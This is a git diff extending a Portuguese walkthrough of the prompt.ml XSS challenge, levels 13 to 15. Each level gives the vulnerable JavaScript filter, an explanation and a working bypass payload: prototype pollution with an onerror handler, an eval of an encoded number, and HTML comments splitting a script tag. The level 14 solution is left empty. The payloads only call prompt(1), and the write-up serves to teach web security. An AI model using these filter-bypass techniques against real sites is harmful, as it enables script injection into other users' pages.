@@ -484,13 +484,16 @@ Além disso, seu código em [JavaScript](https://pt.wikipedia.org/wiki/JavaScrip
 8      return '<h1>' + input + '</h1>';
 9   }
 ```
-Essa função tenta evitar um HTML malicioso ao converter o texto dentro da tag _<h1>_ para maiúsculas, além de alterar o texto da tag `<script>`.
+
+Essa função tenta evitar um HTML malicioso ao converter o texto dentro da tag no _return_ para maiúsculas, além de alterar o texto da tag `<script>`.
 
 Porém, é possível substituir os textos por [entidades HTML](https://www.freeformatter.com/html-entities.html), no caso do comando `prompt(1)`. Além disso, será preciso alterar a tag `<svg>` para usá-la também.
 
 **Análise final**
 
 Uma maneira de mudar a tag `<svg>`, é alterar a letra s pelo símbolo [ſ](https://unicodeplus.com/U+017F), pois eles tem a mesma funcionalidade no HTML.
+
+Utilizando a mesma resolução da fase 1, porém com alterações na escrita da tag `<svg>` e escrevendo o comando através das entidades HTML, temos:
 
 <img width="1166" height="510" alt="image" src="https://github.com/user-attachments/assets/ca946c75-0362-4c34-affc-731b7a21c78c" />
 
@@ -638,6 +641,134 @@ Ao montar exatamente como o _input_ deve ser, temos:
 Input necessário:
 
 >eval(0x258da033.toString(30))(1)
+
+## Fase D (13)
+
+**Análise Inicial**
+
+Esta fase tem a seguinte estrutura:
+
+<img width="1188" height="1041" alt="Screenshot 2025-09-01 123029" src="https://github.com/user-attachments/assets/78ebf3c7-5f73-4f76-905b-8eb9078ef968" />
+
+O seu código em [JavaScript](https://pt.wikipedia.org/wiki/JavaScript) é representado por essas linhas:
+
+
+```
+1  function escape(input) {
+2      // extend method from Underscore library
+3      // _.extend(destination, *sources) 
+4      function extend(obj) {
+5         var source, prop;
+6          for (var i = 1, length = arguments.length; i < length; i++) {
+7              source = arguments[i];
+8              for (prop in source) {
+9                  obj[prop] = source[prop];
+10             }
+11         }
+12         return obj;
+13     }
+14     // a simple picture plugin
+15     try {
+16         // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
+17         var data = JSON.parse(input);
+18         var config = extend({
+19             // default image source
+20             source: 'http://placehold.it/350x150'
+21         }, JSON.parse(input));
+22         // forbit invalid image source
+23         if (/[^\w:\/.]/.test(config.source)) {
+24            delete config.source;
+25         }
+26         // purify the source by stripping off "
+27         var source = config.source.replace(/"/g, '');
+28         // insert the content using mustache-ish template
+29         return '<img src="{{source}}">'.replace('{{source}}', source);
+30     } catch (e) {
+31         return 'Invalid image data.';
+32     }
+33 }        
+```
+
+
+**Análise final**
+
+<img width="1171" height="512" alt="image" src="https://github.com/user-attachments/assets/41d1eb7f-e1ca-4d85-a741-bb0911384f8e" />
+
+Input necessário:
+
+>{"source":{},"&#95;&#95;proto&#95;&#95;":{"source":"$`onerror=prompt(1)>"}}
+
+## Fase E (14)
+
+**Análise Inicial**
+
+A fase 14 tem o seguinte formato:
+
+<img width="1455" height="805" alt="image" src="https://github.com/user-attachments/assets/2a7fd1ab-6030-4ac1-8fef-989bcc690ceb" />
+
+Já seu código em [JavaScript](https://pt.wikipedia.org/wiki/JavaScript) é:
+
+```
+1  function escape(input) {
+2      // I expect this one will have other solutions, so be creative :)
+3      // mspaint makes all file names in all-caps :(
+4      // too lazy to convert them back in lower case
+5      // sample input: prompt.jpg => PROMPT.JPG
+6      input = input.toUpperCase();
+7      // only allows images loaded from own host or data URI scheme
+8      input = input.replace(/\/\/|\w+:/g, 'data:');
+9      // miscellaneous filtering
+10     input = input.replace(/[\\&+%\s]|vbs/gi, '_');
+11     
+12     return '<img src="' + input + '">';
+13 }     
+```
+
+
+**Análise final**
+
+
+
+Input necessário:
+
+>
+
+## Fase F (15)
+
+**Análise Inicial**
+
+Essa fase é bem parecida com a fase 7, com a seguinte estrutura:
+
+<img width="1456" height="752" alt="image" src="https://github.com/user-attachments/assets/0b218ae3-37db-4ec3-8e0f-1074fa83d7c7" />
+
+Com o código em [JavaScript](https://pt.wikipedia.org/wiki/JavaScript) sendo:
+
+```
+1  function escape(input) {
+2      // sort of spoiler of level 7
+3      input = input.replace(/\*/g, '');
+4      // pass in something like dog#cat#bird#mouse...
+5      var segments = input.split('#');
+6  
+7      return segments.map(function(title, index) {
+8          // title can only contain 15 characters
+9          return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
+10     }).join('\n');
+11 }     
+```
+Assim como na fase 7, o _input_ pode ser dividido em partes com o uso do `#` e cada segmento pode conter até 15 caracteres dessa vez.
+
+A principal diferença é que nesse nível, diferente da fase 7, não é possível usar os comentários JavaScript e as aspas serão cortadas devido ao _data-comment_.
+
+**Análise final**
+
+Uma solução para resolver a fase é usar comentários HTML em uma tag para esconder o que queremos executar. Além disso, essa técnica de comentário foi usada na fase 3 também.
+
+<img width="1455" height="745" alt="image" src="https://github.com/user-attachments/assets/4157f84d-4b13-4d25-b711-a2f960d37a0a" />
+
+Input necessário:
+
+>`"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>`
 
 ## Conclusão
 ...
